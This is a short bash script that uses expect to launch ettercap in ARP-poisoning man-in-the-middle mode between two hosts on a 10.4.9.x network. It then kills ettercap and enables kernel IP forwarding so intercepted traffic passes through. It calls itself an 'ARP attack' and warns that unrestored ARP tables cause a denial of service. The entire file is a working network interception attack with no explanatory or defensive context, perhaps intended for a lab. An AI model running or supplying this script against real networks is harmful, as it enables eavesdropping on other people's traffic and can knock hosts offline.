#!/usr/bin/env bash
set -euo pipefail

echo "Starting ettercap...."
/usr/bin/expect <(cat << EOF
  spawn -ignore HUP ettercap -TM arp /10.4.9.1// /10.4.9.3//
  expect "Hit 'h' for inline help"
  sleep 2
  expect_background
  exit 0
EOF
)

echo "Ettercap startup finished - killing it"
pkill -9 ettercap
echo "Enabling kernel ip forwarding..."
sysctl net.ipv4.ip_forward=1

echo "ARP attack complete. Failure to restore ARP tables will result in a DoS"
